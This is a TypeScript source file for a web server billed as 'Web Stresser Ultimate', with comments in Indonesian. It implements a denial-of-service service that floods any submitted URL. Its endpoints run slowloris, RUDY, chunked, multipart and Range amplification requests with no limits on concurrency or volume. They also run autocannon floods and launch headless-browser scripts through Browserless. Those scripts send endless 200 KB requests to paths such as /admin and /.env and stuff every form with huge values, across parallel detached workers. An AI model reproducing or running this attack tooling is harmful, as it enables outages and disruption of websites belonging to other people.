import { Elysia, t } from 'elysia';
import { setGlobalDispatcher, Agent } from 'undici';
import autocannon from 'autocannon';

// Konfigurasi koneksi pool (tanpa batasan internal)
const globalAgent = new Agent({
  connections: 200,
  pipelining: 1,
  keepAliveTimeout: 60000,
});
setGlobalDispatcher(globalAgent);

const activeUsers = new Map<string, number>();
setInterval(() => {
  const now = Date.now();
  for (const [key, timestamp] of activeUsers.entries()) {
    if (now - timestamp > 60000) activeUsers.delete(key);
  }
}, 30000);

function randomString(n: number): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < n; i++) result += chars[Math.floor(Math.random() * chars.length)];
  return result;
}

function generateAmplificationPayload(kb: number, ampType: string): string {
  if (kb <= 0) return '';
  const size = kb * 1024;
  if (ampType === 'range') return '';
  return randomString(size);
}

// ========== SINGLE ATTACK (tanpa batasan) ==========
interface SingleAttackParams {
  url: string;
  method: string;
  headers: Record<string, string>;
  body: string;
  timeout: number;
  retryCount: number;
  randomDelay: number;
  keepAlive: boolean;
  attackType: string;
  amplifyKB: number;
  amplifyEnabled: boolean;
  amplifyType: string;
}

async function singleAttack(params: SingleAttackParams): Promise<any> {
  const {
    url, method, headers, body,
    timeout, retryCount, randomDelay,
    keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
  } = params;

  let finalMethod = method.toUpperCase();
  let finalUrl = url;
  let finalHeaders = { ...headers };
  let finalBody = body || '';
  let useBody = false;

  if (randomDelay > 0) await new Promise(r => setTimeout(r, Math.random() * randomDelay));

  let ampPayload = '';
  if (amplifyEnabled && amplifyKB > 0) {
    ampPayload = generateAmplificationPayload(amplifyKB, amplifyType);
  }

  switch (attackType) {
    case 'range':
      finalHeaders['Range'] = `bytes=0-${amplifyKB * 1024}`;
      break;
    case 'chunked':
      finalBody = body + ampPayload;
      useBody = true;
      finalHeaders['Transfer-Encoding'] = 'chunked';
      break;
    case 'multipart':
      const boundary = `----WebKitFormBoundary${randomString(16)}`;
      finalHeaders['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
      const part = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="amp.txt"\r\nContent-Type: text/plain\r\n\r\n${ampPayload}\r\n--${boundary}--\r\n`;
      finalBody = part;
      useBody = true;
      break;
    case 'slowloris':
      finalHeaders['Connection'] = 'keep-alive';
      break;
    case 'rudy':
      await new Promise(r => setTimeout(r, 2000));
      if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
      else finalBody = body;
      useBody = true;
      break;
    default:
      if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
      else finalBody = body;
      useBody = true;
  }

  // Aturan untuk GET dengan amplification besar
  if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
    finalMethod = 'POST';
    useBody = true;
    finalBody = ampPayload;
  } else if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length <= 2048) {
    const separator = finalUrl.includes('?') ? '&' : '?';
    finalUrl += `${separator}_amp=${encodeURIComponent(ampPayload)}`;
    useBody = false;
  }

  if (!finalHeaders['Accept']) finalHeaders['Accept'] = '*/*';
  if (keepAlive) finalHeaders['Connection'] = 'keep-alive';
  else finalHeaders['Connection'] = 'close';

  // Tidak ada pembatasan timeout internal
  const fetchOptions: any = {
    method: finalMethod,
    headers: finalHeaders,
    signal: AbortSignal.timeout(timeout),
    redirect: 'manual',
    dispatcher: globalAgent,
  };
  if (useBody && (finalMethod === 'POST' || finalMethod === 'PUT' || finalMethod === 'PATCH')) {
    fetchOptions.body = finalBody;
  }

  let lastError: any = null;
  let lastStatusCode = 0;
  let responseSize = 0;
  let responsePreview = '';
  let durationMs = 0;
  let retriesUsed = 0;

  const baseDelay = 100;
  for (let attempt = 0; attempt <= retryCount; attempt++) {
    if (attempt > 0) await new Promise(r => setTimeout(r, baseDelay * attempt));
    const start = Date.now();
    try {
      const res = await fetch(finalUrl, fetchOptions);
      durationMs = Date.now() - start;
      lastStatusCode = res.status;
      const buffer = await res.arrayBuffer();
      responseSize = buffer.byteLength;
      const text = new TextDecoder().decode(buffer);
      responsePreview = text.slice(0, 500);
      if (res.status >= 200 && res.status < 400) {
        retriesUsed = attempt;
        break;
      }
    } catch (err: any) {
      durationMs = Date.now() - start;
      lastError = err;
    }
  }

  const success = lastStatusCode >= 200 && lastStatusCode < 400;
  const errorMsg = lastError ? lastError.message : '';

  return {
    success,
    statusCode: lastStatusCode,
    durationMs,
    error: errorMsg,
    retries: retriesUsed,
    responseSize,
    responseBody: responsePreview,
  };
}

// ========== BATCH ATTACK (tanpa batasan) ==========
interface BatchAttackParams {
  url: string;
  method: string;
  headers: Record<string, string>;
  body: string;
  timeout: number;
  retryCount: number;
  randomDelay: number;
  keepAlive: boolean;
  attackType: string;
  amplifyKB: number;
  amplifyEnabled: boolean;
  amplifyType: string;
  concurrency: number;
  total: number;
}

async function batchAttack(params: BatchAttackParams): Promise<any> {
  const {
    url, method, headers, body, timeout, retryCount, randomDelay,
    keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
    concurrency, total,
  } = params;

  const startTime = Date.now();
  let totalSuccess = 0;
  let totalFail = 0;
  let totalBytes = 0;
  let allLatencies: number[] = [];

  const runOne = async () => {
    const result = await singleAttack({
      url, method, headers, body, timeout, retryCount, randomDelay,
      keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
    });
    if (result.success) totalSuccess++;
    else totalFail++;
    totalBytes += result.responseSize;
    allLatencies.push(result.durationMs);
  };

  // Tidak ada pembatasan concurrency atau total
  const workers: Promise<void>[] = [];
  let index = 0;
  for (let i = 0; i < concurrency; i++) {
    workers.push(new Promise<void>(async (resolve) => {
      while (index < total) {
        index++;
        await runOne();
      }
      resolve();
    }));
  }
  await Promise.all(workers);

  const totalTime = Date.now() - startTime;
  const avgLatency = allLatencies.length ? allLatencies.reduce((a,b)=>a+b,0)/allLatencies.length : 0;
  const rps = totalTime > 0 ? ((totalSuccess+totalFail) / (totalTime/1000)).toFixed(2) : 0;

  return {
    success: true,
    totalRequests: (totalSuccess+totalFail),
    successCount: totalSuccess,
    failCount: totalFail,
    totalBytes,
    totalTimeMs: totalTime,
    avgLatencyMs: avgLatency,
    rps,
    latencies: allLatencies.slice(0, 100),
  };
}

// ========== AUTOCANNON (tanpa batasan) ==========
interface AutocannonOptions {
  url: string;
  connections: number;
  duration: number;
  amount?: number;
  method?: string;
  headers?: Record<string, string>;
  body?: string;
}

async function runAutocannon(options: AutocannonOptions): Promise<any> {
  return new Promise((resolve, reject) => {
    const instance = autocannon(
      {
        url: options.url,
        connections: options.connections,
        duration: options.duration,
        amount: options.amount,
        method: (options.method || 'GET') as any,
        headers: options.headers,
        body: options.body,
        pipelining: 1,
        reconnectRate: 0,
      },
      (err: any, result: any) => {
        if (err) reject(err);
        else resolve(result);
      }
    );
    autocannon.track(instance, { renderProgressBar: true });
  });
}

// ========== ELYSIA APP ==========
export const app = new Elysia()
  .onError(({ error, set }) => {
    set.status = 200;
    console.error(error);
    const errorMessage = error instanceof Error ? error.message : String(error);
    return { success: false, error: errorMessage };
  })
  .get('/api/status', () => ({
    status: 'ok',
    message: 'Web Stresser Ultimate - Elysia on Vercel (FULL UNLIMITED)',
    version: '5.0.0',
  }))
  .post('/api/attack', async ({ body }) => {
    try {
      const result = await singleAttack(body as SingleAttackParams);
      return result;
    } catch (err: any) {
      return { success: false, error: err.message, durationMs: 0 };
    }
  }, {
    body: t.Object({
      url: t.String(),
      method: t.String(),
      headers: t.Record(t.String(), t.String()),
      body: t.String(),
      timeout: t.Number(),
      retryCount: t.Number(),
      randomDelay: t.Number(),
      keepAlive: t.Boolean(),
      attackType: t.String(),
      amplifyKB: t.Number(),
      amplifyEnabled: t.Boolean(),
      amplifyType: t.String(),
    }),
  })
  .post('/api/batch', async ({ body }) => {
    try {
      const result = await batchAttack(body as BatchAttackParams);
      return result;
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  }, {
    body: t.Object({
      url: t.String(),
      method: t.String(),
      headers: t.Record(t.String(), t.String()),
      body: t.String(),
      timeout: t.Number(),
      retryCount: t.Number(),
      randomDelay: t.Number(),
      keepAlive: t.Boolean(),
      attackType: t.String(),
      amplifyKB: t.Number(),
      amplifyEnabled: t.Boolean(),
      amplifyType: t.String(),
      concurrency: t.Number(),
      total: t.Number(),
    }),
  })
  .post('/api/autocannon', async ({ body }) => {
    try {
      const result = await runAutocannon(body as AutocannonOptions);
      return { success: true, result };
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  }, {
    body: t.Object({
      url: t.String(),
      connections: t.Number(),
      duration: t.Number(),
      amount: t.Optional(t.Number()),
      method: t.Optional(t.String()),
      headers: t.Optional(t.Record(t.String(), t.String())),
      body: t.Optional(t.String()),
    }),
  })
  // ==================== BROWSERLESS DITINGKATKAN (BERBAHAYA) ====================
  .post('/api/bot/browserless', async ({ body }) => {
    const { url, loop, intervalMs } = body;
    const apiKey = process.env.BROWSERLESS_API_KEY;
    if (!apiKey) return { success: false, error: 'Missing BROWSERLESS_API_KEY' };

    // Skrip yang sangat agresif untuk membombardir target melalui headless browser
    const attackScript = `
export default async ({ page, context }) => {
  const targetUrl = context.url;
  const browser = page.browser();

  const attackPage = async (p) => {
    try {
      await p.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 15000 });
    } catch (e) {}

    // Infinite storm of HTTP requests (fetch)
    p.evaluate(async (baseUrl) => {
      const bigPayload = 'A'.repeat(1024 * 200); // 200 KB per request
      const endpoints = ['/', '/api', '/login', '/register', '/search', '/submit', '/contact', '/admin', '/wp-admin', '/.env'];
      const methods = ['GET', 'POST', 'PUT', 'DELETE'];
      while (true) {
        const promises = [];
        for (let i = 0; i < 30; i++) {
          const method = methods[i % methods.length];
          const endpoint = endpoints[i % endpoints.length];
          const url = baseUrl + endpoint;
          promises.push(
            fetch(url, {
              method,
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: method === 'GET' ? undefined : bigPayload,
              mode: 'no-cors',
            }).catch(() => {})
          );
        }
        await Promise.all(promises);
        await new Promise(resolve => setTimeout(resolve, 5));
      }
    }, targetUrl).catch(() => {});

    // Infinite form submission with huge data
    p.evaluate(async () => {
      while (true) {
        const forms = document.querySelectorAll('form');
        for (const form of forms) {
          const inputs = form.querySelectorAll('input:not([type=submit])');
          inputs.forEach(inp => { inp.value = 'X'.repeat(10000); });
          form.submit();
        }
        await new Promise(r => setTimeout(r, 200));
      }
    }).catch(() => {});
  };

  // Create many pages to multiply the damage
  const pageCount = 8;
  for (let i = 0; i < pageCount; i++) {
    browser.newPage().then(newPage => {
      attackPage(newPage);
    }).catch(() => {});
  }
  attackPage(page);

  // Keep the function alive for a minute so the browser stays active
  await new Promise(resolve => setTimeout(resolve, 60000));
  return { data: { status: 'attacking' }, type: 'application/json' };
}`;

    // Jalankan satu serangan (detached, tidak menunggu selesai)
    const executeAttack = async () => {
      try {
        await fetch(
          `https://production-sfo.browserless.io/function?token=${apiKey}&detach=true`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code: attackScript, context: { url } }),
          }
        );
      } catch (e) {
        // ignore network errors
      }
    };

    if (loop) {
      // Luncurkan beberapa loop paralel untuk efek berkelanjutan
      const interval = intervalMs || 1000;
      const concurrency = 5; // semakin banyak semakin berbahaya
      for (let i = 0; i < concurrency; i++) {
        const attackLoop = async () => {
          await executeAttack();
          setTimeout(attackLoop, interval);
        };
        attackLoop(); // start without awaiting
      }
      return { success: true, message: `Serangan browserless berkelanjutan dimulai dengan ${concurrency} worker paralel` };
    } else {
      await executeAttack();
      return { success: true, message: 'Satu serangan browserless telah diluncurkan (detached)' };
    }
  }, {
    body: t.Object({
      url: t.String(),
      loop: t.Optional(t.Boolean()),
      intervalMs: t.Optional(t.Number()),
    }),
  })
  .get('/api/heartbeat', ({ request }) => {
    const ip = request.headers.get('x-forwarded-for') || 'unknown';
    const ua = request.headers.get('user-agent') || 'unknown';
    const key = `${ip}|${ua}`;
    activeUsers.set(key, Date.now());
    return { active: activeUsers.size };
  });

export default app;
